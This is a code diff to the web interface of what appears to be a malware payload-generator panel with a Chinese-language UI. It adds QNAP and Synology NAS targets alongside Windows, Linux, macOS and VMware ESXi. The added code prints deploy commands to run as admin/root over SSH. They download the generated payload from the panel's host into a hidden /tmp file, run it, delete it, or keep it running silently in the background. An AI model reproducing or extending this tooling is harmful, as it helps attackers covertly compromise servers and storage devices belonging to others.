@@ -135,6 +135,8 @@ $__kfiles = [
       <option value="linux">🐧 Linux (Python3)</option>
       <option value="macos">🍎 macOS (Python3)</option>
       <option value="esxi">🖥️ VMware ESXi (Shell)</option>
+            <option value="qnap">🗄️ QNAP QTS (Shell)</option>
+            <option value="synology">🗄️ Synology DSM (Shell)</option>
     </select>
   </div>
 </div>
@@ -442,7 +444,7 @@ function genPayload(){
   fetch('generate.php',{method:'POST',body:fd})
   .then(r=>r.json()).then(d=>{
     if(!d.ok){res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';return;}
-    var pname={'win':'Windows','linux':'Linux','macos':'macOS','esxi':'VMware ESXi'}[p]||p;
+    var pname={'win':'Windows','linux':'Linux','macos':'macOS','esxi':'VMware ESXi','qnap':'QNAP QTS','synology':'Synology DSM'}[p]||p;
     var dl='payloads/'+d.file;
     var html='<div class="gen-ok">';
     html+='<i class="fas fa-check-circle"></i> <b>'+pname+'</b> 载荷已就绪: <a href="'+dl+'" download>'+d.file+'</a> ('+d.size+' B)';
@@ -469,6 +471,21 @@ function genPayload(){
         'curl -sL '+rurl+' -o /tmp/.jsh && sh /tmp/.jsh && rm -f /tmp/.jsh\n\n'+
         '# 方式3: 后台运行\n'+
         'wget -q '+rurl+' -O /tmp/.jsh && nohup sh /tmp/.jsh > /dev/null 2>&1 &'+
+        '</pre>';
+    }else if(p==='qnap'||p==='synology'){
+      var rurl=location.origin+'/'+dl;
+      var sshhint=(p==='qnap')
+        ? '# QNAP: 控制台 > 网络和文件服务 > Telnet/SSH > 启用 SSH\n'
+        : '# Synology: 控制面板 > 终端机和SNMP > 启用 SSH 功能\n';
+      html+='<pre class="dt-code" style="margin:0">'+
+        '# NAS 一键部署（以 admin/root 身份 SSH 登录后执行）\n'+
+        sshhint+'\n'+
+        '# 方式1: wget\n'+
+        'wget -q '+rurl+' -O /tmp/.jsh && sh /tmp/.jsh; rm -f /tmp/.jsh\n\n'+
+        '# 方式2: curl\n'+
+        'curl -sL '+rurl+' -o /tmp/.jsh && sh /tmp/.jsh; rm -f /tmp/.jsh\n\n'+
+        '# 方式3: 后台静默运行（断开 SSH 后继续）\n'+
+        'wget -q '+rurl+' -O /tmp/.jsh && nohup sh /tmp/.jsh >/dev/null 2>&1 &'+
         '</pre>';
     }else{
       html+='<pre class="dt-code" style="margin:0">'+
